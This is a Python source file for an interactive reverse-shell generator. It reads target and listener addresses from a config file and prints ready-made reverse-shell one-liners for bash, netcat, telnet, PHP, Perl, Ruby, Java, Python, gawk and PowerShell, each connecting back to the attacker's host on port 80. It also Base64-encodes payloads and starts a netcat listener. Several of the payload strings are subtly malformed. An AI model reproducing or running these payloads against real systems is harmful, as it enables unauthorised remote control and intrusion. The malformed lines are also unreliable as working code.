try:
    def findshell():
        import os
        from configparser import ConfigParser
        config = ConfigParser()
        path = str(os.path.expanduser('~')) + "/config.cfg"
        config.read(path)
        print("""
    Available Reverse Shells:

    [1] bash reverse shell               [2] php reverse shell

    [3] netcat reverse shell             [4] telnet reverse shell | port 80 req.

    [5] perl reverse shell               [6] perl windows reverse shell

    [7] ruby reverse shell               [8] java reverse shell

    [9] python reverse shell             [10] gawk reverse shell
    
    [11] powershell windows reverse shell

                Choose a type of shell from above
        """)
        shelltype = input("#> ")
        rhost = config['DEFAULT']['rhost']
        lhost = config['DEFAULT']['lhost']
        print("=== Confirm Settings ===")
        print("Target: %s" % rhost)
        print("Localhost: %s" % lhost)
        print("========================")
        check = str(input("[y\\n] "))
        if check == "y":
            if shelltype == "1":
                shell = "bash"
            elif shelltype == "2":
                shell = "php"
            elif shelltype == "3":
                shell = "netcat"
            elif shelltype == "4":
                shell = "telnet"
            elif shelltype == "5":
                shell = "perl"
            elif shelltype == "6":
                shell = "perl windows"
            elif shelltype == "7":
                shell = "ruby"
            elif shelltype == "8":
                shell = "java"
            elif shelltype == "9":
                shell = "python"
            elif shelltype == "10":
                shell = "gawk"
            elif shelltype == "11":
                shell = "powershell windows"
            return shell, lhost
        else:
            os.system("clear")
            run()

    def run():
        import os
        from base64 import b64encode
        shell, lhost = findshell()
        if shell == "bash":
            payload1 = "exec /bin/bash 0&0 2>&0"
            payload2 = """exec 5<>/dev/tcp/%s/80
    cat <&5 | while read line; do $line 2>&5 >&5; done  

    # or:

    while read line 0<&5; do $line 2>&5 >&5; done""" % lhost
            payload3 = "0<&196;exec 196<>/dev/tcp/%s/80; sh <&196 >&196 2>&196" % lhost
            payload4 = "bash -i >& /dev/tcp/%s/80 0>&1" % lhost
        elif shell == "php":
            payload1 = """php -r '$sock=fsockopen("%s",80);exec("/bin/sh - i < &3 > &3 2 > &3");'""" % lhost
            payload2 = ""
            payload3 = ""
            payload4 = ""
        elif shell == "netcat":
            payload1 = "nc -e /bin/sh %s 80" % lhost
            payload2 = "/bin/sh | nc %s 80" % lhost
            payload3 = "rm -f /tmp/p; mknod /tmp/p p && nc %s 80 0/tmp/p" % lhost
            payload4 = ""
        elif shell == "telnet":
            payload1 = "rm -f /tmp/p; mknod /tmp/p p && telnet %s 80 0/tmp/p" % lhost
            payload2 = "telnet %s 80 | /bin/bash | telnet %s 443" % (lhost, lhost)
            payload3 = ""
            payload4 = ""
        elif shell == "perl":
            payload1 = """perl -e 'use Socket;$i="%s";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % lhost
            payload2 = ""
            payload3 = ""
            payload4 = ""
        elif shell == "perl windows":
            payload1 = """perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"%s:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" % (lhost)
            payload2 = """perl -e 'use Socket;$i="%d";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % lhost
            payload3 = ""
            payload4 = ""
        elif shell == "ruby":
            payload1 = """ruby -rsocket -e'f=TCPSocket.open("%s",80).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'""" % lhost
            payload2 = ""
            payload3 = ""
            payload4 = ""
        elif shell == "java":
            payload1 = """r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/80;cat <&5 | while read line; do \\`\\$line 2>&5 >&5; done"] as String[])
    p.waitFor()""" % lhost
            payload2 = ""
            payload3 = ""
            payload4 = ""
        elif shell == "python":
            payload1 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % lhost
            payload2 = ""
            payload3 = ""
            payload4 = ""
        elif shell == "gawk":
            payload1 = """#!/usr/bin/gawk -f

    BEGIN {
            Port    =       80
            Prompt  =       "bkd> "

            Service = "/inet/tcp/" Port "/0/0"
            while (1) {
                    do {
                            printf Prompt |& Service
                            Service |& getline cmd
                            if (cmd) {
                                    while ((cmd |& getline) > 0)
                                            print $0 |& Service
                                    close(cmd)
                            }
                    } while (cmd != "exit")
                    close(Service)
            }
    }"""
            payload2 = ""
            payload3 = ""
            payload4 = ""
            #                shell = "powershell windows"
        elif shell == "powershell windows":
            payload1 = '''powershell $client = New-Object System.Net.Sockets.TCPClient("''' +lhost+ '''",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''
            payload2 = ""
            payload3 = ""
            payload4 = ""
        else: 
            print("Unknown Shell Type.")
            run()
        print("\n===== Available Payloads =====")
        print("\nPayload 1:\n%s\n" % payload1)
        if payload2 != "":
            print("Payload 2:\n%s\n" % payload2)
        if payload3 != "":
            print("Payload 3:\n%s\n" % payload3)
        if payload4 != "":
            print("Payload 4:\n%s\n" % payload4)
        print("\nWould you like to convert a payload from Base64?")
        ask = str(input("[y\\n] ").lower())
        if ask == "y":
            payload = input("\nSelect Payload: ")
            if payload == "1":
                chosen = payload1
            elif payload == "2":
                chosen = payload2
            elif payload == "3":
                chosen = payload3
            elif payload == "4":
                chosen = payload4
            encoded = b64encode(b"%s" % bytes(chosen, "utf-8"))
            print("Encoded Base64 Payload: %s" % encoded)
        else:
            pass
        print("Would You Like To Start A NetCat listener on %s:80?" % lhost)
        ask2 = str(input("[y\\n] ").lower())
        if ask2 == "y":
            os.system("sudo nc -nlvp 80")
        else:
            pass
except KeyboardInterrupt:
    pass
